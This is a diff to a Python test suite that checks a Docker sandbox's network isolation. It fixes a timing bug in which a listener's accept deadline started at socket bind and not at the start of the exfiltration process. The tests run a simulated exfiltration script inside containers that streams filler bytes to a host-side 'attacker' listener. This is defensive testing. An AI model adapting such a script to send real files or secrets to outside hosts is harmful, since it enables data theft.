@@ -52,6 +52,23 @@ control failed with `assert 0 > 0`. A failing positive control is the one
 outcome that is neither an honest pass nor an honest failure: it says the
 measurement did not happen. `host_addresses` below carries the mapping that
 fixes it and the argument for its shape.
+
+**B183, and it is a different failure that looked exactly like that one.** Both
+positive controls passed alone and failed inside a full `-n auto` run, and the
+tempting reading -- contention, or the nine-hour leaked `sync-patch-sandbox`
+container sitting on the bridge -- was wrong on both counts. The container
+connected in **0.022s** and sent continuously; the host-side `accept()` had
+already raised `TimeoutError`, because its deadline started when the socket was
+bound and 11.359s of Docker setup happened next, against a 10s budget. The
+network was never involved. The leaked container was eliminated by measurement:
+a full suite passed 3989/3989 while it was up. What was wrong was the anchor --
+a deadline measured from the wrong event -- and load only decided whether the
+anchor's error was large enough to show.
+
+Two things follow, and both are why this file no longer measures anything from
+a fixed offset: `_start_attacker_listener` does not begin its accept deadline
+until `_exfiltrate_in_background` arms it, and the positive controls wait for a
+byte to arrive rather than sleeping a fixed 0.5s and asking afterwards.
 """
 
 from __future__ import annotations
@@ -148,31 +165,68 @@ def _host_addresses(container) -> list[str]:
     return addresses
 
 
-def _start_attacker_listener() -> tuple[socket.socket, int, dict[str, int], threading.Event]:
+# How long the listener waits for the container's connection, measured from the
+# moment the exfiltration process has actually been started -- never from the
+# moment the socket was bound. See `_start_attacker_listener` for why the
+# difference between those two anchors is the whole of B183.
+_ACCEPT_TIMEOUT_SECONDS = 30
+
+# How long the listener thread will wait to be told the exfiltration has started.
+# Bounded rather than indefinite so a test that raises before arming ends with a
+# recorded reason instead of a thread parked forever on a dead run.
+_ARM_TIMEOUT_SECONDS = 180
+
+
+def _start_attacker_listener() -> tuple[
+    socket.socket, int, dict[str, object], threading.Event, threading.Event
+]:
     """A plain TCP server standing in for the attacker-controlled endpoint the
     threat model describes -- a real socket accepting a real connection over
     Docker's real network stack, reached from inside a container at whatever
     address `host_addresses` says names this host there, rather than anything
     mocked.
 
-    Returns `(server_socket, port, received, stop)`. `received["bytes"]` is
+    Returns `(server_socket, port, received, stop, armed)`. `received["bytes"]` is
     updated by a background thread as data arrives, so a test can watch it
     grow (or stop growing) without blocking its own control flow on `recv`.
+
+    `armed` is the event that starts the accept deadline, and it exists because
+    B183 was that deadline running during setup rather than during the thing it
+    bounds. `_exfiltrate_in_background` sets it; a caller that never does gets a
+    recorded reason rather than a thread parked on a run that already failed.
     """
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     server.bind(("0.0.0.0", 0))
     server.listen(1)
     port = server.getsockname()[1]
-    received = {"bytes": 0}
+    received = {
+        "bytes": 0,
+        "accepted_at": None,
+        "first_byte_at": None,
+        "accept_error": None,
+        "listener_started_at": time.monotonic(),
+    }
     stop = threading.Event()
+    armed = threading.Event()
 
     def _drain() -> None:
-        server.settimeout(10)
+        # The deadline begins here, once the exfiltration process has actually been
+        # started -- not when the socket was bound. Everything between those two
+        # moments is Docker setup this test performs itself, and B183 was that setup
+        # spending the whole budget before the container could connect. Waiting is
+        # safe: `listen()` has already been called, so a connection made before
+        # `accept()` runs is held in the backlog rather than refused.
+        if not armed.wait(timeout=_ARM_TIMEOUT_SECONDS):
+            received["accept_error"] = f"never armed within {_ARM_TIMEOUT_SECONDS}s"
+            return
+        server.settimeout(_ACCEPT_TIMEOUT_SECONDS)
         try:
             conn, _addr = server.accept()
-        except OSError:
+        except OSError as exc:
+            received["accept_error"] = repr(exc)
             return
+        received["accepted_at"] = time.monotonic()
         conn.settimeout(0.5)
         while not stop.is_set():
             try:
@@ -183,15 +237,19 @@ def _start_attacker_listener() -> tuple[socket.socket, int, dict[str, int], thre
                 break
             if not chunk:
                 break
+            if received["first_byte_at"] is None:
+                received["first_byte_at"] = time.monotonic()
             received["bytes"] += len(chunk)
         conn.close()
 
     thread = threading.Thread(target=_drain, daemon=True)
     thread.start()
-    return server, port, received, stop
+    return server, port, received, stop, armed
 
 
-def _exfiltrate_in_background(container, port: int, addresses: list[str]) -> None:
+def _exfiltrate_in_background(
+    container, port: int, addresses: list[str], armed: threading.Event
+) -> None:
     """Start a process inside `container` that connects to the listener on the
     host at `port` and sends continuously until the socket refuses a write --
     the exact shape the review's attack takes: code running during dependency
@@ -206,24 +264,82 @@ def _exfiltrate_in_background(container, port: int, addresses: list[str]) -> Non
         "import socket, time, sys\n"
         f"port = {port}\n"
         f"hosts = {addresses!r}\n"
+        "log = open('/tmp/exfil.log', 'w', buffering=1)\n"
+        "log.write(f'start {time.time()} hosts={hosts} port={port}\\n')\n"
         "s = None\n"
         "for host in hosts:\n"
         "    try:\n"
+        "        t0 = time.time()\n"
         "        s = socket.create_connection((host, port), timeout=5)\n"
+        "        log.write(f'connected {host} after {time.time()-t0:.3f}s\\n')\n"
         "        break\n"
-        "    except OSError:\n"
+        "    except OSError as exc:\n"
+        "        log.write(f'failed {host} after {time.time()-t0:.3f}s: {exc!r}\\n')\n"
         "        continue\n"
         "if s is None:\n"
+        "    log.write('no candidate connected\\n')\n"
         "    sys.exit(1)\n"
+        "sent = 0\n"
         "while True:\n"
         "    try:\n"
         "        s.sendall(b'x' * 1024)\n"
-        "    except Exception:\n"
+        "        sent += 1024\n"
+        "        if sent % 51200 == 0:\n"
+        "            log.write(f'sent {sent} by {time.time()}\\n')\n"
+        "    except Exception as exc:\n"
+        "        log.write(f'send stopped after {sent} bytes: {exc!r}\\n')\n"
         "        break\n"
         "    time.sleep(0.02)\n"
     )
     result = _run_docker("exec", "-d", container.id, "python3", "-c", script)
     assert result.returncode == 0, f"failed to start the exfiltration process: {result.stderr}"
+    # The process exists from here, so this is the event the listener's deadline is
+    # measured from. Arming after the exec rather than before keeps the budget on
+    # "the container connects" and off "the daemon got round to us".
+    armed.set()
+
+
+def _exfil_diagnostics(container) -> str:
+    """Everything the container can say about why nothing reached the listener.
+
+    Only read on a failing positive control: the distinction that matters is
+    "connected and delivered late" from "never connected at all", and the
+    assertion text alone cannot carry it.
+    """
+    log = _run_docker("exec", container.id, "cat", "/tmp/exfil.log")
+    return f"--- /tmp/exfil.log (rc={log.returncode}) ---\n{log.stdout}{log.stderr}"
+
+
+def _wait_for_first_bytes(received: dict, container, timeout: float = 30.0) -> float:
+    """Block until the listener has counted a byte, and return how long that took.
+
+    The positive control's claim is that data flows from inside the container to
+    the host at all -- not that it does so within some number of milliseconds. A
+    fixed `time.sleep` before reading the counter asserts the second thing while
+    appearing to assert the first, which is the same error as B183's anchor in a
+    smaller place: under load the sleep expires before the first byte and the
+    control reports "no data reached the listener" about a container that is
+    sending happily.
+
+    Failure carries the container's own account of what it did, because "connected
+    in 0.022s and sent continuously" and "never connected at all" are the two
+    outcomes that matter here and the byte count alone cannot tell them apart.
+    """
+    started = time.monotonic()
+    deadline = started + timeout
+    while time.monotonic() < deadline:
+        if received["bytes"] > 0:
+            return time.monotonic() - started
+        time.sleep(0.05)
+
+    raise AssertionError(
+        f"positive control failed: no data reached the listener within {timeout}s.\n"
+        f"  seconds since listener started: "
+        f"{time.monotonic() - received['listener_started_at']:.3f}\n"
+        f"  accepted_at: {received['accepted_at']!r}\n"
+        f"  accept_error: {received['accept_error']!r}\n"
+        f"  bytes: {received['bytes']}\n" + _exfil_diagnostics(container)
+    )
 
 
 # A real `/proc/net/route` from a `python:3.12-slim` container on Docker's default bridge. The
@@ -265,6 +381,50 @@ def test_a_container_with_no_default_route_yields_nothing_rather_than_a_guess():
     )
 
     assert host_addresses(None, no_default) == []
+
+
+def test_the_listener_waits_from_the_moment_exfiltration_starts_not_from_the_bind(monkeypatch):
+    """B183: the listener's accept deadline must not be spent on the setup that precedes it.
+
+    Measured 2026-08-17 inside a full `-n auto` run: the container's exfiltration process
+    connected in **0.022s** and sent continuously, and the positive control still failed with
+    `bytes: 0`, because the host-side `accept()` had already raised `TimeoutError` --
+    11.359s had passed since the socket was bound, against a 10s deadline, spent on the five
+    serialized Docker daemon round-trips (`create`, `start`, two `exec`, one `exec -d`) that
+    the test performs *between* binding the socket and the container being able to connect.
+
+    So the failure was never about the network and never about a leaked container. It is an
+    anchor: a deadline started at the wrong event. Load only decides whether the anchor's
+    error is large enough to matter, which is why this reproduced under `-n auto` and never
+    alone.
+
+    No Docker here on purpose -- the defect is in the harness's own timing, so it is pinned
+    with a plain loopback socket and a delay that stands in for the setup. A test that needed
+    a loaded daemon to fail would be the same unreadable thing it is characterizing.
+    """
+    monkeypatch.setattr(sys.modules[__name__], "_ACCEPT_TIMEOUT_SECONDS", 1.0)
+
+    server, port, received, stop, armed = _start_attacker_listener()
+    try:
+        # Longer than the accept deadline: the setup a real run spends on Docker.
+        time.sleep(2.0)
+        armed.set()
+
+        with socket.create_connection(("127.0.0.1", port), timeout=5) as client:
+            client.sendall(b"x" * 1024)
+
+            deadline = time.monotonic() + 10
+            while received["bytes"] == 0 and time.monotonic() < deadline:
+                time.sleep(0.02)
+
+        assert received["bytes"] > 0, (
+            "the listener stopped waiting before the connection it exists to receive was made: "
+            f"accept_error={received['accept_error']!r}. The deadline must start when the "
+            "exfiltration is armed, not when the socket is bound."
+        )
+    finally:
+        stop.set()
+        server.close()
 
 
 def test_patch_agent_execution_context_reaches_arbitrary_host_today(tmp_path):
@@ -368,13 +528,12 @@ def test_disconnect_network_does_not_stop_an_already_open_socket():
     """
     from sync.remediate import sandbox
 
-    server, port, received, stop = _start_attacker_listener()
+    server, port, received, stop, armed = _start_attacker_listener()
     try:
         with sandbox.ephemeral_container(image=_TEST_IMAGE) as container:
-            _exfiltrate_in_background(container, port, _host_addresses(container))
-            time.sleep(0.5)
+            _exfiltrate_in_background(container, port, _host_addresses(container), armed)
+            _wait_for_first_bytes(received, container)
             before = received["bytes"]
-            assert before > 0, "positive control failed: no data reached the listener before disconnect"
 
             sandbox.disconnect_network(container)
             at_return = received["bytes"]
@@ -418,7 +577,7 @@ def test_never_networked_container_receives_nothing_after_install_container_is_t
     """
     from sync.remediate import sandbox
 
-    server, port, received, stop = _start_attacker_listener()
+    server, port, received, stop, armed = _start_attacker_listener()
     try:
         with sandbox.ephemeral_container(image=_TEST_IMAGE) as install_container:
             mkdir = _run_docker("exec", install_container.id, "mkdir", "-p", "/workspace/artifact")
@@ -430,10 +589,8 @@ def test_never_networked_container_receives_nothing_after_install_container_is_t
             assert write.returncode == 0, write.stderr
 
             addresses = _host_addresses(install_container)
-            _exfiltrate_in_background(install_container, port, addresses)
-            time.sleep(0.5)
-            before = received["bytes"]
-            assert before > 0, "positive control failed: no data reached the listener before teardown"
+            _exfiltrate_in_background(install_container, port, addresses, armed)
+            _wait_for_first_bytes(received, install_container)
 
             with sandbox.ephemeral_container(image=_TEST_IMAGE, network="none") as patch_container:
                 sandbox.copy_between_containers(install_container, patch_container, "/workspace/artifact")
